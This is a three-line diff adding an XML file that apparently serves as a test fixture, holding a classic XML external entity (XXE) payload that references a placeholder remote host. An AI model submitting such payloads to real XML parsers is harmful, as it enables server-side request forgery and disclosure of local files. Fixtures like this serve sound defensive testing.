@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "https://my_fake_site.com/foo">]>
+<root>&xxe;</root>
